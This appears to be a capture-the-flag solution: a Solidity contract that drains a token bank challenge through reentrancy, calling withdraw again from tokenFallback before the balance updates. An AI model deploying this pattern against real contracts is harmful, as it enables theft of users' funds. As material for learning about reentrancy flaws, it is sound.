// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

interface SimpleERC223Token {
    function transfer(address to, uint256 value, bytes data) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface TokenBankChallenge {
    function withdraw(uint256 amount) external;
    function token() external view returns (address);
}

/**
 * @title TokenSaleExploit
 * @dev The vulnerability comes with the 'withdraw' function that updates the 'balanceOf' the 'msg.sender' in the chall contract AFTER the call to 'token.transfer()'.
 * Since the underlying function calls the 'tokenFallback' function if the 'to' argument is a contract, we can implement it with a new call to the withdraw function effectively triggering the re-entrancy.
 * This allows for double withdrawing, effectively emptying the entire token supply from the underlying contract.
 */
contract TokenBankExploit {
    address contract_chall = address(0x0);

    function setChall(address _new) public {
        contract_chall = _new;
    }

    function tokenFallback(address from, uint256 value, bytes data) public {
        if (SimpleERC223Token(TokenBankChallenge(contract_chall).token()).balanceOf(contract_chall) > 0) // Check that the total supply (holded by the chall contract) is not empty
            exploit(value); // Triggering re-entrancy until the contract is drained
    }

    function exploit(uint256 _amount) public {
        TokenBankChallenge(contract_chall).withdraw(_amount);
    }

    // This function is first called before the exploit to transfer the tokens from the player (given at the challenge contract's creation) to this contract in order to call the 'withdraw()' function.
    // See 'soluce.js' for the allowance setup
    function transferToken(address _player, uint256 _amount) public {
        SimpleERC223Token(TokenBankChallenge(contract_chall).token()).transferFrom(_player, address(this), _amount);
    }
}